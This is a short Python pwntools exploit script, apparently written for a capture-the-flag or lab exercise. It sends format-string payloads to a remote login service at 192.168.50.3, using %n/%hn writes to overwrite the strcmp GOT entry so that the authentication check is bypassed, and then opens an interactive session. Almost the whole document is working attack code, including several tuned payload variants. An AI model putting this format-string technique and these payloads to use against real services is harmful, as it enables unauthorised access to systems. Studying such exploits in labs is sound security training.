#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#conn = remote("localhost", 5006)
conn = remote("192.168.50.3", 5006) 
recieved = conn.recvuntil("Username: ")
log.info("Recieved: " + recieved)
# Goal - write target value 0x3030394A
#        to the destination address of 0x3030379F (strcmp)
answer = "\x14\x50\x30\x30..%16698x$%2$n"
# (0x394A --> 14666) - ~10
answer = "\x14\x50\x30\x30\x16\x50\x30\x30..%14655x$%2$n%63190x%3$hn"
answer = "\x14\x50\x30\x30\x16\x50\x30\x30..%14655x$%2$n%63206x%3$hn"
# (0x3030 --> 12336)
# wrap around? 65535 - (14655 - 12336 +-)
#answer = "\x14\x50\x30\x30\x16\x50\x30\x30..%14655x$%2$n63216%x%3$hn"
log.info("Sending answer")
conn.sendline(answer)
received = conn.recvuntil("Password: ")
conn.sendline("\n")
conn.interactive()
